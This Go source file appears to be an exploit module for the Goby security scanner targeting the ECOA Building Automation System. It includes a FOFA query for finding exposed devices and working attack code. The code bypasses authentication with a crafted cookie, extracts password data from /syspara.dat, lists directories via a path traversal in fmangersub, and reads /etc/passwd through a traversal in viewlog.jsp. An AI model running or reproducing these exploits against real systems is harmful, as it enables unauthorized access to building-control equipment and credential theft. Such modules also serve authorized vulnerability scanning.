package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ECOA Building System multiple vulnerabilities",
    "Description": "<p>ECOA Technologies, the company formerly known as ECOA Technologies, was established in Taiwan in 1993. The company specializes in BMS control products.</p><p> There are multiple vulnerabilities in the ECOA automation system, including information leakage, directory traversal, file reading, etc.</p>",
    "Impact": "ECOA Building System multiple vulnerabilities",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.ecoa.com.tw\">http://www.ecoa.com.tw/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "ECOA",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read",
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "ECOA Building 系统多个漏洞",
            "Description": "<p>ECOA 技术公司该公司原名为ECOA Technologies，于1993年在台湾成立。该公司专门从事 BMS 控制产品。</p><p>ECOA 自动化系统存在多个漏洞，包括信息泄露、目录遍历、文件读取等.</p>",
            "Impact": "<p>ECOA 自动化系统存在多个漏洞，包括信息泄露、目录遍历、文件读取等。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"http://www.ecoa.com.tw\">http://www.ecoa.com.tw/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "ECOA",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ECOA Building System multiple vulnerabilities",
            "Description": "<p>ECOA Technologies, the company formerly known as ECOA Technologies, was established in Taiwan in 1993. The company specializes in BMS control products.</p><p> There are multiple vulnerabilities in the ECOA automation system, including information leakage, directory traversal, file reading, etc.</p>",
            "Impact": "ECOA Building System multiple vulnerabilities",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.ecoa.com.tw\">http://www.ecoa.com.tw/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "ECOA",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "body=\"ECOA\" && title=\"ECOA\"",
    "GobyQuery": "body=\"ECOA\" && title=\"ECOA\"",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.ecoa.com.tw",
    "DisclosureDate": "2021-09-12",
    "References": [
        "https://packetstormsecurity.com/files/164110/ECOA-Building-Automation-System-Configuration-Download-Information-Disclosure.html",
        "https://packetstormsecurity.com/files/164118/ECOA-Building-Automation-System-Local-File-Disclosure.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "webuser,directory,fileread",
            "show": ""
        },
        {
            "name": "directory",
            "type": "createSelect",
            "value": "../../../../../../../etc",
            "show": "AttackType=directory"
        },
        {
            "name": "fileread",
            "type": "createSelect",
            "value": "../../../../../../../../etc/passwd",
            "show": "AttackType=fileread"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "ECOA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "8576"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/syspara.dat"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Cookie", "UCLS=19'")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "/webpage/pwsd.bin") {
					return true
				}
			}
			uri2 := "/fmangersub?cpath=/"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Cookie", "UCLS=19'")
			if resp2, err2 := httpclient.DoHttpRequest(u, cfg2); err2 == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "system.bin") {
					return true
				}
			}
			uri3 := "/viewlog.jsp"
			cfg3 := httpclient.NewPostRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.Header.Store("Cookie", "UCLS=19'")
			cfg3.Data = `yr=2020&mh=6&fname=../../../../../../../../etc/passwd`
			if resp3, err3 := httpclient.DoHttpRequest(u, cfg3); err3 == nil {
				if resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "root:(.*?):0:0:") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "webuser" {
				uri := "/syspara.dat"
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.Header.Store("Cookie", "UCLS=19'")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root") {
						body := regexp.MustCompile(`(?s)/webpage/pwsd.bin(.*?)/webpage/`).FindStringSubmatch(resp.RawBody)
						expResult.Output = body[1]
						expResult.Success = true
					}
				}
			}
			if ss.Params["AttackType"].(string) == "directory" {
				directorycmd := ss.Params["directory"].(string)
				uri := "/fmangersub?cpath=/" + directorycmd
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.Header.Store("Cookie", "UCLS=19'")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						Dtrectory := regexp.MustCompile("(?s)<td fname='(.*?)' >").FindAllStringSubmatch(resp.RawBody, -1)
						for _, i := range Dtrectory {
							expResult.Output += i[1] + "\n"
							fmt.Println(i)
						}
						expResult.Success = true
					}
				}
			}
			if ss.Params["AttackType"].(string) == "fileread" {
				filepathcmd := ss.Params["fileread"].(string)
				uri := "/viewlog.jsp"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.Header.Store("Cookie", "UCLS=19'")
				cfg.Data = `yr=2020&mh=6&fname=` + filepathcmd
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root") {
						body := regexp.MustCompile(`(?s)border-style:solid'(.*?)</div>`).FindStringSubmatch(resp.RawBody)
						expResult.Output = body[1]
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
